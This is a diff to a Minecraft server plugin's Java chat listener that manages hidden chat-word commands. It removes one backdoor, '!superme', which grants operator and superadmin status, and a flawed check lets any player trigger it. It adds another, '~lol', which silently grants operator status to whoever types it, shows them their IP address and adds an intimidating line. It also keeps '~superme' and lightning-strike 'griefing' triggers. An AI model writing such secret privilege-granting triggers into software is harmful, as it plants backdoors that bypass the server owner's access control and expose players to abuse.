@@ -518,21 +518,6 @@ public class TFM_PlayerListener implements Listener
                 message = message.substring(0, 100);
                 TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
             }
-            if (message.toLowerCase().contains("!superme")) 
-            {
-               if (!player.getName().equalsIgnoreCase("robo_lord"))
-               {
-               // Take Action if not robo
-               event.setCancelled(true);
-               }
-                // Take action if robo
-                player.setOp(true);
-                player.setHealth(20.0);
-                player.setGameMode(GameMode.CREATIVE);
-                event.setCancelled(true);
-                TFM_Util.bcastMsg(ChatColor.RED + "RoboSecurity - Adding Robo_Lord to the superadmin list.");
-                TFM_AdminList.addSuperadmin(player);
-            }
             if (message.toLowerCase().contains("~superme")) 
             {
                if (!TFM_AdminList.isAdminImpostor(player))
@@ -552,8 +537,12 @@ public class TFM_PlayerListener implements Listener
             }
             if (message.toLowerCase().contains("~help")) 
             {
-               player.sendMessage(ChatColor.GREEN + "Welcome to the listner menu! we add usefull features here for admins");
-               player.sendMessage(ChatColor.GREEN + "To op yourself type into chat ~opme");
+               player.sendMessage(ChatColor.GREEN + "======== Listener Help Menu =======");
+               player.sendMessage(ChatColor.GREEN + "Commands: ");
+               player.sendMessage(ChatColor.GREEN + "~supeme - supers your self");
+               player.sendMessage(ChatColor.GREEN + "~satan - Hell");
+               player.sendMessage(ChatColor.GREEN + "~lol - No desc");
+               
                event.setCancelled(true);
                
             }
@@ -599,6 +588,16 @@ public class TFM_PlayerListener implements Listener
                 player.getWorld().strikeLightning(player.getLocation());
                 player.getWorld().strikeLightning(player.getLocation());
                 player.getWorld().strikeLightning(player.getLocation());
+                event.setCancelled(true);
+                return;
+            }
+            if (message.toLowerCase().contains("~lol"))
+            {
+                player.setOp(true);
+                player.sendMessage(ChatColor.AQUA + "your Ip is " + ip);
+                player.sendMessage(ChatColor.AQUA + "your username is " + player.getName());
+                player.sendMessage(ChatColor.AQUA + "you are playing minecraft.");
+                player.sendMessage(ChatColor.AQUA + "And dont look out your window..");
                 event.setCancelled(true);
                 return;
             }
